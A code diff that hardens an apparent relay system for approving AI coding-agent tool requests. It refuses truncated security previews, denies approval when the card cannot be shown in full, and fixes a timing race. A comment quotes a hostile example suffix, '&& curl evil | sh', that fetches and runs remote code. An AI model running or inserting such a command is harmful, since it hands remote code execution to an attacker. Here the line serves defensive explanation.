@@ -111,7 +111,17 @@ export function verdictFromMessage(message: RelayMessage): PermissionVerdict | n
 }
 
 const MAX_DESCRIPTION_CHARS = 500;
-const MAX_PREVIEW_CHARS = 1500;
+export const MAX_PERMISSION_PREVIEW_CHARS = 6_000;
+
+export class PermissionPreviewTooLongError extends Error {
+  constructor(readonly actualChars: number) {
+    super(
+      `permission input is ${actualChars} characters; Relay only permits approval when the full ` +
+        `${MAX_PERMISSION_PREVIEW_CHARS}-character security preview can be shown`,
+    );
+    this.name = "PermissionPreviewTooLongError";
+  }
+}
 
 /** Same defense-in-depth sanitization as the channel plugin. */
 export function sanitizeRelayedText(value: string, maxChars: number): string {
@@ -120,8 +130,37 @@ export function sanitizeRelayedText(value: string, maxChars: number): string {
     .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g, "")
     .replace(/\s+/g, " ")
     .trim();
-  if (cleaned.length <= maxChars) return cleaned;
-  return `${cleaned.slice(0, maxChars - 1)}…`;
+  return clampHeadTail(cleaned, maxChars);
+}
+
+/**
+ * Over-limit values keep head + tail with an explicit omission marker: a
+ * plain head truncation lets a hostile suffix (`… && curl evil | sh`) hide
+ * behind the ellipsis on the approval card.
+ */
+export function clampHeadTail(value: string, maxChars: number): string {
+  if (value.length <= maxChars) return value;
+  const tailChars = Math.min(300, Math.floor(maxChars / 4));
+  const marker = ` […${value.length - maxChars} of ${value.length} chars omitted…] `;
+  const headChars = Math.max(1, maxChars - tailChars - marker.length);
+  return `${value.slice(0, headChars)}${marker}${value.slice(value.length - tailChars)}`;
+}
+
+/**
+ * Security-sensitive tool input is never truncated. If it cannot fit in the
+ * approval card, the caller must deny instead of asking the owner to approve
+ * an operation with concealed content.
+ */
+export function sanitizePermissionPreview(value: string): string {
+  const cleaned = value
+    .replace(/\r\n?/g, "\n")
+    .replace(/[\u200b-\u200f\u2028-\u202e\u2066-\u2069\ufeff]/g, "")
+    .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g, "")
+    .trim();
+  if (cleaned.length > MAX_PERMISSION_PREVIEW_CHARS) {
+    throw new PermissionPreviewTooLongError(cleaned.length);
+  }
+  return cleaned;
 }
 
 export interface PermissionCardInput {
@@ -144,7 +183,7 @@ export function buildPermissionCard(input: PermissionCardInput): {
 } {
   const toolName = sanitizeRelayedText(input.toolName ?? "", 100) || "a tool";
   const description = sanitizeRelayedText(input.description ?? "", MAX_DESCRIPTION_CHARS);
-  const inputPreview = sanitizeRelayedText(input.inputPreview ?? "", MAX_PREVIEW_CHARS);
+  const inputPreview = sanitizePermissionPreview(input.inputPreview ?? "");
   const id = input.requestId;
 
   const lines = [
@@ -286,29 +325,61 @@ export class PermissionBroker {
       })),
       source: "acp",
     };
+    let card: ReturnType<typeof buildPermissionCard>;
+    try {
+      card = buildPermissionCard({
+        requestId,
+        conversationId,
+        engineLabel: engine === "codex" ? "Codex" : engine === "opencode" ? "opencode" : "Claude",
+        toolName: askInput.toolName,
+        description: askInput.title,
+        inputPreview: askInput.inputPreview,
+      });
+    } catch (error) {
+      // Never ask the owner to approve a partially represented operation.
+      this.log(`approval ${requestId} denied before posting: ${error}`);
+      return denyDecision(approval);
+    }
+
     // Durable (create-once) before the card goes out.
     this.approvals.create(approval);
 
-    const card = buildPermissionCard({
-      requestId,
-      conversationId,
-      engineLabel: engine === "codex" ? "Codex" : engine === "opencode" ? "opencode" : "Claude",
-      toolName: askInput.toolName,
-      description: askInput.title,
-    });
-    const posted = await this.client.postMessage(card.body, card.idempotencyKey);
-    approval.relay_message_id = posted.message_id;
-    this.approvals.put(approval);
-
-    return await new Promise<PermissionDecision>((resolve) => {
+    // Arm the waiter BEFORE the card goes out: a fast tap can race the POST's
+    // response, and a verdict that lands before the waiter exists would
+    // otherwise be recorded as a file resolution that this promise then
+    // overwrites — or worse, timeout-denied after the user already allowed.
+    const decision = new Promise<PermissionDecision>((resolve) => {
       const timer = setTimeout(() => {
         this.waiters.delete(requestId);
         this.approvals.consume(requestId);
         this.log(`approval ${requestId} timed out → deny`);
         resolve(denyDecision(approval));
       }, this.timeoutMs);
-      timer.unref?.();
+      // The engine is awaiting this decision; the timeout must keep the
+      // process alive so every unanswered ask deterministically denies.
       this.waiters.set(requestId, { approval, resolve, timer });
     });
+
+    try {
+      const posted = await this.client.postMessage(card.body, card.idempotencyKey);
+      // The waiter may already have resolved (fast tap): only annotate while
+      // the approval file is still ours.
+      if (this.waiters.has(requestId)) {
+        approval.relay_message_id = posted.message_id;
+        this.approvals.put(approval);
+      }
+    } catch (error) {
+      // Card never reached the phone: withdraw the ask and deny.
+      const waiter = this.waiters.get(requestId);
+      if (waiter) {
+        clearTimeout(waiter.timer);
+        this.waiters.delete(requestId);
+        this.approvals.consume(requestId);
+        this.log(`approval ${requestId} card post failed → deny: ${error}`);
+        waiter.resolve(denyDecision(approval));
+      }
+    }
+
+    return await decision;
   }
 }
